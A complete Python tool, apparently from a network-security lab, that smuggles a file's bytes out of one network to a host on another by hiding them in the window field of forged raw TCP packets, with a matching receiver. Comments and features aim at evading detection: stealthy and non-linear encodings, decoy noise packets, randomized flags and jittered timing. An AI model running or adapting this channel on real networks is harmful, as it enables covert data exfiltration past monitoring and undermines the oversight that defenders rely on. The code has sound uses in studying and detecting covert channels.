#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import math
import argparse
import hashlib
from ctypes import *
from array import array

# Constants
DEST_PORT = 8888
SRC_PORT = 8888
PACKET_SIZE = 65535

# Encoding modes
ENCODING_BINARY = 'binary'  # Use full window size range for binary data
ENCODING_ASCII = 'ascii'    # Use window size for direct ASCII encoding
ENCODING_CUSTOM = 'custom'  # Use a custom encoding scheme

class PseudoHeader(Structure):
    _fields_ = [
        ("src_addr", c_uint32),
        ("dst_addr", c_uint32),
        ("placeholder", c_uint8),
        ("protocol", c_uint8),
        ("tcp_len", c_uint16)
    ]

def checksum(data):
    """Calculate checksum of the given data"""
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return socket.ntohs(s & 0xffff)

def get_usec():
    """Get current time in microseconds"""
    return int(time.time() * 1000000)

class EnhancedCovertChannel:
    def __init__(self, mode=ENCODING_ASCII, window_base=1000, bit_pattern=None):
        """
        Initialize the covert channel
        
        Args:
            mode: Encoding mode (ascii, binary, custom)
            window_base: Base window size to add encoded data to
            bit_pattern: Custom bit pattern for encoding in binary mode
        """
        self.mode = mode
        self.window_base = window_base
        self.bit_pattern = bit_pattern or [1, 2, 4, 8, 16, 32, 64, 128]
        self.sequence_counter = random.randint(1000, 10000)
        self.window_size_cache = {}  # For realistic window size selection
        
    def encode_window_size(self, byte_value):
        """
        Encode a byte value into a window size value
        
        Args:
            byte_value: Value to encode (0-255)
            
        Returns:
            Window size value
        """
        if self.mode == ENCODING_ASCII:
            # Direct value encoding in window field
            return byte_value
        
        elif self.mode == ENCODING_BINARY:
            # More stealthy encoding using bit patterns
            # Split byte into bits and distribute across common window size ranges
            if byte_value in self.window_size_cache:
                return self.window_size_cache[byte_value]
                
            bits = [(byte_value >> i) & 1 for i in range(8)]
            # Use a range of typical window sizes to avoid detection
            window_size = self.window_base
            for i, bit in enumerate(bits):
                if bit:
                    window_size += self.bit_pattern[i]
                    
            # Cache the result
            self.window_size_cache[byte_value] = window_size
            return window_size
            
        elif self.mode == ENCODING_CUSTOM:
            # Custom encoding scheme - here using a non-linear transform 
            # This makes it harder to detect the pattern
            transformed = ((byte_value * 167) % 251) + self.window_base
            return transformed
            
        return byte_value  # Fallback to direct encoding
    
    def decode_window_size(self, window_size):
        """
        Decode a window size back to original byte value
        
        Args:
            window_size: Window size value
            
        Returns:
            Original byte value
        """
        if self.mode == ENCODING_ASCII:
            return window_size
            
        elif self.mode == ENCODING_BINARY:
            # Inverse of the encoding operation
            window_size -= self.window_base
            byte_value = 0
            for i in range(8):
                if window_size & self.bit_pattern[i]:
                    byte_value |= (1 << i)
            return byte_value
            
        elif self.mode == ENCODING_CUSTOM:
            # Inverse of custom transform
            # Find the value that when transformed gives this window size
            for i in range(256):
                if ((i * 167) % 251) + self.window_base == window_size:
                    return i
            return 0  # Unable to decode
            
        return window_size  # Fallback
    
    def create_packet(self, src_ip, dest_ip, data_byte, ttl=64):
        """
        Create an IP/TCP packet with covert data in window size
        
        Args:
            src_ip: Source IP address
            dest_ip: Destination IP address
            data_byte: Data byte to encode
            ttl: IP TTL value
            
        Returns:
            Complete IP/TCP packet
        """
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20  # IP + TCP headers
        ip_id = random.randint(10000, 65000)
        ip_frag_off = 0
        ip_ttl = ttl
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # Pack IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
            ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP header
        tcp_source = SRC_PORT
        tcp_dest = DEST_PORT
        tcp_seq = self.sequence_counter
        self.sequence_counter += 1
        tcp_ack_seq = 0
        tcp_doff = 5  # Data offset (header size in 32-bit words)
        
        # Vary flags to appear like normal traffic
        tcp_flags = 0x10  # ACK
        if random.random() < 0.05:  # Occasionally add PSH flag
            tcp_flags |= 0x08
        
        # Encode data in window size
        tcp_window = self.encode_window_size(data_byte)
        
        tcp_check = 0
        tcp_urg_ptr = 0
        
        # TCP header packing
        tcp_offset_res = (tcp_doff << 4) + 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
            tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum calculation
        psh = struct.pack('!4s4sBBH', 
            ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header))
        
        # Calculate TCP checksum
        tcp_check = checksum(psh + tcp_header)
        
        # Repack TCP header with correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
            tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Final packet
        return ip_header + tcp_header
    
    def send_message(self, message, dest_ip, src_ip, delay_mean=0.5, 
                     add_noise=False, error_correction=False, repeat=1, 
                     logfile="sent_log.csv"):
        """
        Send a covert message using TCP window size
        
        Args:
            message: Message to send
            dest_ip: Destination IP address
            src_ip: Source IP address
            delay_mean: Mean delay between packets
            add_noise: Add random noise packets
            error_correction: Add error correction
            repeat: Number of times to repeat transmission
            logfile: Log file name
        """
        # Create a raw socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except socket.error as e:
            print(f"Error creating socket: {e}")
            print("Note: This script requires root privileges")
            return
        
        dest_addr = (dest_ip, 0)
        
        # Convert string message to bytes if needed
        if isinstance(message, str):
            message = message.encode()
            
        # Add a simple checksum
        if error_correction:
            digest = hashlib.md5(message).digest()[:4]  # Use first 4 bytes of MD5
            message = message + digest + b'\x04'  # Add EOF marker
        else:
            message = message + b'\x04'  # Just EOF marker
            
        with open(logfile, "w") as log:
            log.write("run,index,byte,encoded,time_us\n")
            
            for r in range(1, repeat + 1):
                print(f"\n[=== RUN {r}/{repeat} ===]")
                start_usec = get_usec()
                
                for i, byte in enumerate(message):
                    # Create and send packet
                    packet = self.create_packet(src_ip, dest_ip, byte)
                    sock.sendto(packet, dest_addr)
                    
                    # Log
                    usec = get_usec()
                    encoded = self.encode_window_size(byte)
                    log.write(f"{r},{i},{byte},{encoded},{usec}\n")
                    
                    # Print progress
                    if byte >= 32 and byte <= 126:
                        print(f"[>] Sent '{chr(byte)}' ({byte}) - Encoded as window {encoded}")
                    else:
                        print(f"[>] Sent byte {byte:#04x} - Encoded as window {encoded}")
                    
                    # Add random delay with exponential distribution
                    rand_uniform = random.random()
                    delay = -math.log(1.0 - rand_uniform) * delay_mean
                    time.sleep(delay)
                    
                    # Add noise packets occasionally
                    if add_noise and random.random() < 0.1:
                        # Send a few normal-looking packets
                        noise_count = random.randint(1, 3)
                        for _ in range(noise_count):
                            # Create a packet with a window size in the normal range
                            noise_window = random.randint(4000, 65000)
                            tcp_flags = random.choice([0x10, 0x18])  # ACK or ACK+PSH
                            
                            # Pack IP header
                            ip_ihl = 5
                            ip_ver = 4
                            ip_tos = 0
                            ip_tot_len = 20 + 20  # IP + TCP headers
                            ip_id = random.randint(10000, 65000)
                            ip_frag_off = 0
                            ip_ttl = random.randint(50, 64)
                            ip_proto = socket.IPPROTO_TCP
                            ip_check = 0
                            ip_saddr = socket.inet_aton(src_ip)
                            ip_daddr = socket.inet_aton(dest_ip)
                            
                            ip_ihl_ver = (ip_ver << 4) + ip_ihl
                            
                            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
                                ip_proto, ip_check, ip_saddr, ip_daddr)
                            
                            # TCP header
                            tcp_source = SRC_PORT
                            tcp_dest = DEST_PORT
                            tcp_seq = self.sequence_counter
                            self.sequence_counter += 1
                            tcp_ack_seq = 0
                            tcp_doff = 5
                            tcp_offset_res = (tcp_doff << 4) + 0
                            tcp_check = 0
                            tcp_urg_ptr = 0
                            
                            tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                                tcp_flags, noise_window, tcp_check, tcp_urg_ptr)
                            
                            # Calculate checksum
                            psh = struct.pack('!4s4sBBH', 
                                ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header))
                            tcp_check = checksum(psh + tcp_header)
                            
                            # Repack with correct checksum
                            tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                                tcp_flags, noise_window, tcp_check, tcp_urg_ptr)
                            
                            packet = ip_header + tcp_header
                            sock.sendto(packet, dest_addr)
                            
                            print(f"[✓] Sent noise packet (window: {noise_window})")
                            time.sleep(random.uniform(0.01, 0.1))
                
                end_usec = get_usec()
                duration = (end_usec - start_usec) / 1000000.0
                throughput = len(message) / duration
                
                print(f"[✔] Run {r} complete: {duration:.2f} seconds, {throughput:.2f} bytes/sec")
        
        sock.close()
        print("[✔] Transmission complete")

    def receive_message(self, host_ip=None, port=DEST_PORT, timeout=None, logfile="recv_log.csv"):
        """
        Receive covert message from TCP packets
        
        Args:
            host_ip: Host IP to listen on
            port: Port to listen on
            timeout: Reception timeout in seconds
            logfile: Log file name
            
        Returns:
            Received message
        """
        # Use environment variable if host_ip not provided
        if not host_ip:
            host_ip = os.getenv('INSECURENET_HOST_IP')
            if not host_ip:
                print("Host IP not provided and INSECURENET_HOST_IP not set")
                return None
        
        # Create raw socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error as e:
            print(f"Error creating socket: {e}")
            print("Note: This script requires root privileges")
            return None
        
        if timeout:
            sock.settimeout(timeout)
            
        # Buffer for message
        message_buffer = bytearray()
        last_seq = 0
        out_of_order = 0
        missing = 0
        
        print(f"Listening for covert data on {host_ip}:{port}...")
        
        with open(logfile, "w") as log:
            log.write("index,byte,encoded,time_us\n")
            
            try:
                while True:
                    # Receive packet
                    packet = sock.recvfrom(PACKET_SIZE)[0]
                    
                    # Parse IP header
                    ip_header = packet[0:20]
                    iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                    
                    # IP header length
                    ihl = (iph[0] & 0xF)
                    iph_length = ihl * 4
                    
                    # Check protocol
                    protocol = iph[6]
                    if protocol != socket.IPPROTO_TCP:
                        continue
                    
                    # TCP header
                    tcp_header = packet[iph_length:iph_length+20]
                    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
                    
                    source_port = tcph[0]
                    dest_port = tcph[1]
                    sequence = tcph[2]
                    acknowledgement = tcph[3]
                    doff_reserved = tcph[4]
                    flags = tcph[5]
                    window = tcph[6]
                    
                    # Check if this packet is relevant
                    if dest_port != port:
                        continue
                    
                    # Check if this is an ACK packet with potential covert data
                    if flags & 0x10:  # ACK flag
                        # Try to decode the window size
                        try:
                            # Check if potential covert data in window size
                            decoded_byte = self.decode_window_size(window)
                            
                            # Log the reception
                            current_usec = int(time.time() * 1000000)
                            log.write(f"{len(message_buffer)},{decoded_byte},{window},{current_usec}\n")
                            
                            # Track sequence for detecting lost/out of order packets
                            if last_seq != 0:
                                if sequence < last_seq:
                                    out_of_order += 1
                                    print(f"[!] Detected out-of-order packet: {sequence} < {last_seq}")
                                elif sequence > last_seq + 1:
                                    gap = sequence - last_seq - 1
                                    missing += gap
                                    print(f"[!] Detected missing packets: {gap} packets lost")
                            
                            last_seq = sequence
                            
                            # Check for EOF marker
                            if decoded_byte == 0x04:
                                print(f"[✔] Received EOF marker")
                                
                                # If error correction is enabled, verify checksum
                                if len(message_buffer) >= 4:
                                    # Extract and verify MD5 checksum
                                    message_data = message_buffer[:-4]
                                    received_digest = message_buffer[-4:]
                                    
                                    calculated_digest = hashlib.md5(message_data).digest()[:4]
                                    if received_digest == calculated_digest:
                                        print(f"[✔] Checksum verification passed")
                                        # Only return the actual message, not the checksum
                                        return message_data
                                    else:
                                        print(f"[✘] Checksum verification failed!")
                                        # Return the data anyway, it might still be useful
                                        return message_buffer
                                
                                # If we didn't return yet, just return the buffer
                                return message_buffer
                            
                            # Add to message buffer if not EOF
                            message_buffer.append(decoded_byte)
                            
                            # Print progress
                            if 32 <= decoded_byte <= 126:  # Printable ASCII
                                print(f"[<] Received '{chr(decoded_byte)}' ({decoded_byte}) - Decoded from window {window}")
                            else:
                                print(f"[<] Received byte {decoded_byte:#04x} - Decoded from window {window}")
                                
                        except Exception as e:
                            print(f"Error decoding: {e}")
                    
            except socket.timeout:
                print(f"[!] Reception timeout after {timeout} seconds")
                if message_buffer:
                    return message_buffer
                return None
                
            except KeyboardInterrupt:
                print("\n[!] Reception interrupted by user")
                if message_buffer:
                    return message_buffer
                return None
                
            finally:
                sock.close()
                print(f"[i] Statistics: {out_of_order} out-of-order packets, {missing} missing packets")

def main():
    parser = argparse.ArgumentParser(description="Enhanced TCP Covert Channel")
    
    # Common arguments
    parser.add_argument("--mode", choices=[ENCODING_ASCII, ENCODING_BINARY, ENCODING_CUSTOM],
                        default=ENCODING_ASCII, help="Encoding mode")
    parser.add_argument("--window-base", type=int, default=1000,
                        help="Base window size")
    parser.add_argument("--port", type=int, default=DEST_PORT,
                        help="TCP port")
    
    subparsers = parser.add_subparsers(dest="command", help="Command")
    
    # Sender arguments
    sender = subparsers.add_parser("send", help="Send covert data")
    sender.add_argument("file", help="File to send")
    sender.add_argument("--delay", type=float, default=0.5,
                        help="Delay between packets (seconds)")
    sender.add_argument("--repeat", type=int, default=1,
                        help="Number of times to repeat transmission")
    sender.add_argument("--noise", action="store_true",
                        help="Add noise packets")
    sender.add_argument("--error-correction", action="store_true",
                        help="Add error correction")
    sender.add_argument("--logfile", default="sent_log.csv",
                        help="Log file")
    
    # Receiver arguments
    receiver = subparsers.add_parser("receive", help="Receive covert data")
    receiver.add_argument("--output", default="received_data",
                         help="Output file")
    receiver.add_argument("--timeout", type=float,
                         help="Reception timeout (seconds)")
    receiver.add_argument("--logfile", default="recv_log.csv",
                         help="Log file")
    
    args = parser.parse_args()
    
    # Create covert channel object
    covert_channel = EnhancedCovertChannel(
        mode=args.mode,
        window_base=args.window_base
    )
    
    if args.command == "send":
        # Read file
        try:
            with open(args.file, "rb") as f:
                data = f.read()
        except Exception as e:
            print(f"Error reading file: {e}")
            return
        
        # Get IP addresses
        dest_ip = os.getenv('INSECURENET_HOST_IP')
        src_ip = os.getenv('SECURENET_HOST_IP')
        
        if not dest_ip or not src_ip:
            print("ENV INSECURENET_HOST_IP or SECURENET_HOST_IP not set")
            return
        
        # Send data
        covert_channel.send_message(
            data, dest_ip, src_ip,
            delay_mean=args.delay,
            add_noise=args.noise,
            error_correction=args.error_correction,
            repeat=args.repeat,
            logfile=args.logfile
        )
    
    elif args.command == "receive":
        # Receive data
        host_ip = os.getenv('INSECURENET_HOST_IP')
        
        received_data = covert_channel.receive_message(
            host_ip=host_ip,
            port=args.port, 
            timeout=args.timeout,
            logfile=args.logfile
        )
        
        if received_data:
            # Save to file
            with open(args.output, "wb") as f:
                f.write(received_data)
            print(f"[✔] Saved {len(received_data)} bytes to {args.output}")
    
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0) 